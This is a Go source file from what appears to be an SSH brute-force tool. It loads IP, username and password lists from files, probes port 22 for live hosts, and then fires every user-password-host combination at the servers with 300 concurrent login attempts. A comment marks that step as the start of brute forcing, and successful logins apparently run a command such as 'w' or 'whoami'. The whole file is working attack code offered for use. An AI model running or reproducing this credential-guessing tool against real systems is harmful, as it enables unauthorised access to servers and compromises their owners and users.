package plugin

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/zh-five/golimit"
)

func Readfile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Open %s error, %v\n", filename, err)
		os.Exit(0)
	}
	defer file.Close()
	var content []string
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			content = append(content, scanner.Text())
		}
	}
	return content, nil
}

type Sshcrack struct {
	Ip   string
	User string
	Pass string
}

var Checkiplists []string

func HandleCraklist() {
	var cracklist []Sshcrack
	iplists, _ := Readfile("ip.txt")
	fmt.Println("\n[+]get ip.txt done")

	username, _ := Readfile("user.txt")
	fmt.Println("[+]get user.txt done")

	passwd, _ := Readfile("password.txt")
	fmt.Println("[+]get password.txt done")
	wg1 := golimit.NewGoLimit(300)
	for i, iplist := range iplists {
		if !strings.Contains(iplist, ":") {
			iplists[i] = iplist + ":22"
		}
		wg1.Add()
		go func(i string) {
			CheckPortAlive(i)
			wg1.Done()
		}(iplists[i])
	}
	wg1.WaitZero()
	fmt.Printf("%v ip is alive", len(Checkiplists))
	fmt.Println("[+]handle ip.txt done")

	/*
		合并字典
	*/
	for _, pass := range passwd {
		for _, user := range username {
			for _, iplist := range Checkiplists {
				cracklist = append(cracklist, Sshcrack{
					Ip:   iplist,
					User: user,
					Pass: pass,
				})
			}
		}
	}
	fmt.Println("[+]handle cracklist done")
	/*
		开始爆破
	*/
	wg := golimit.NewGoLimit(300)
	for _, value := range cracklist {
		wg.Add()
		go func(value Sshcrack) {
			CheckSsh(value.User, value.Pass, value.Ip, "w") // 可以替换成whoami
			wg.Done()
		}(value)
	}
	wg.WaitZero()
	fmt.Println("[+] all is done")
}
